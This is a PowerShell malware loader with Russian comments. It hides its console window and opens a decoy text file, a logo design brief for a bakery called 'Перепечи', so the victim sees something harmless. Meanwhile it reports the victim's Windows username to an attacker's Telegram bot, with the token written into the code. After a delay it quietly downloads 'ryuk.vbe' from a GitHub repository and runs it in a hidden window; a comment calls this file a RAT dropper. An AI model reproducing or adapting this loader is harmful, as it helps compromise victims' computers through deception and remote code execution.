# СКРЫВАЕМ ОКНО POWERSHELL
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

# СОЗДАЁМ И ЗАПУСКАЕМ ЛЕГИТИМНЫЙ TXT
$fileName = "ЛОГО_для_перепечи.com.txt"
$filePath = Join-Path $env:LOCALAPPDATA $fileName

$content = @"
Проект: Создание нового логотипа для пекарни «Перепечи».
Сайт для анализа: https://перепечи.com/

1. Краткая справка о бренде и цель
    Чем занимается: Пекарня, специализирующаяся на выпечке традиционных удмуртских перепечей (открытые пироги с начинкой).
    Суть бренда: Домашняя, ручная работа, гостеприимство, аутентичный вкус, этнический колорит в современной трактовке.
    Цель логотипа: Создать запоминающийся, «вкусный» и теплый визуальный символ, который передает суть продукта и может стать основой для будущей айдентики.

2. Концепция и ключевые сообщения
Логотип должен визуально транслировать:
    Традиции и ремесло: Связь с удмуртской кухней, ручная лепка, выпечка в печи.
    Домашний уют и гостеприимство: Тепло, щедрость, открытость.
    Качество и натуральность: Свежая выпечка, аппетитный вид.

3. Требования к дизайну логотипа
    Формат: Комбинированный (знак + текст). Знак должен быть узнаваем и работать отдельно (например, для фавикона или социальных сетей).
    Стилистика: Теплая, современная, немного рукотворная. Избегать:
        Слишком сложных и детализированных иллюстраций.
        Холодных, технологичных или корпоративных стилей.
        Прямолинейного использования стоковых иконок «пирога».
    Обязательный элемент: Текстовое написание названия «Перепечи» на кириллице.
    Желательная графическая идея: Обыграть в знаке:
        Букву «П» (стилизованную под арку входа в печь или форму перепечи).
        Символ печи/очага (как источник тепла и центр приготовления).
        Стилизованное изображение самой перепечи (например, вид сверху на открытый пирог с начинкой).
        Элемент этнического орнамента (удмуртский узор, вплетенный в шрифт или графику).

4. Цветовая палитра и шрифты (рекомендации для лого)
    Цвета (предложить 2-3 варианта):
        Теплая гамма: Оттенки терракотового, коричневого (корочка), песочного, сливочного.
        Акценты: Глубокий зеленый, бордовый (цвет начинки — зелень, мясо, ягоды).
        Вариант: Рассмотреть возможность монохромной (черно-белой) версии для штампов и печати на пакетах.
    Шрифты: Рукописные, каллиграфические с засечками или аккуратные гротески с ручным характером. Критерий: читаемость даже в маленьком размере.

5. Технические требования и итоговые файлы
    Итоговые файлы должны включать:
        Векторные исходники: .ai и .eps (все слои, шрифты в кривых).
        Растровые версии: .png с прозрачным фоном (разрешение от 2000 px по большей стороне).
		
РЕФЕРЕНСЫ, САЙТ И ДРУГИЕ ВОЗМОЖНО ПОЛЕЗНЫЕ МАТЕРИАЛЫ НАХОДЯТСЯ В ЭТОЙ ЖЕ ПАПКЕ.
"@

$content | Out-File -FilePath $filePath -Encoding UTF8
Invoke-Item $filePath

# ОТПРАВЛЯЕМ СООБЩЕНИЕ В TELEGRAM
$Token = "8263447327:AAH2UWtHaUU0i_3OmxK7mzmRLTK8MfsWzSk"
$ChatID = "7063407604"
$CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$Message = "The user's shortcut was enabled for user: $CurrentUser"

$URL = "https://api.telegram.org/bot$Token/sendMessage"

$Body = @{
    chat_id = $ChatID
    text = $Message
} | ConvertTo-Json

try {
    $Response = Invoke-RestMethod -Uri $URL -Method Post -ContentType "application/json" -Body $Body
} catch {
}

# ЗАДЕРЖКА
Start-Sleep -Seconds 444

# СКРЫТО СКАЧИВАЕМ И ЗАПУСКАЕМ ПЕРЕНОСЧИК RAT
$Url = "https://github.com/Mafin111/MafinREP111/raw/refs/heads/main/SCRRC4ryuk.vbe"
$FileName = "ryuk.vbe"
$LocalAppData = [Environment]::GetFolderPath("LocalApplicationData")
$DownloadPath = Join-Path $LocalAppData $FileName

try {
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($Url, $DownloadPath)
    
    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
    $processInfo.FileName = $DownloadPath
    $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $processInfo.CreateNoWindow = $true
    [System.Diagnostics.Process]::Start($processInfo) | Out-Null
}
catch {
	
}


exit